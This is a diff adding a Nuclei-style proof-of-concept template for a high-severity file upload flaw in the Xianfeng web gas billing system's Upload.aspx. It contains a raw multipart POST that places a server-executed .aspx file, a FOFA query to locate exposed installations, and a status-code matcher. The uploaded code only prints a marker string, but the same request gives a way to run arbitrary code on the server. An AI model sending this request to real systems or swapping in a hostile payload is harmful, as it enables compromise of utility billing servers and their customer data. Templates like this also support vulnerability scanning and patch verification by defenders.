@@ -1,0 +1,79 @@
+id: poc-rv371qrsz9lozxfx
+info:
+  name: 先锋WEB燃气收费系统 Upload.aspx 文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rv371qrsz9lozxfx'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rv371qrsz9lozxfx
+    fofa: app="先锋WEB燃气收费系统"
+http:
+- raw:
+  - 'POST /AjaxService/Upload.aspx HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Content-Type: multipart/form-data; boundary=------------GFioQpMK0vv2
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+
+
+    ------------GFioQpMK0vv2
+
+
+    Content-Disposition: form-data; name="Fdata"; filename="dudesuite.aspx"
+
+
+    Content-Type: application/octet-stream
+
+
+
+
+    <% Response.Write("dudesuite") %>
+
+
+    ------------GFioQpMK0vv2
+
+
+    Content-Disposition: form-data; name="submit"
+
+
+
+
+    Submin
+
+
+    ------------GFioQpMK0vv2--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    .aspx
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
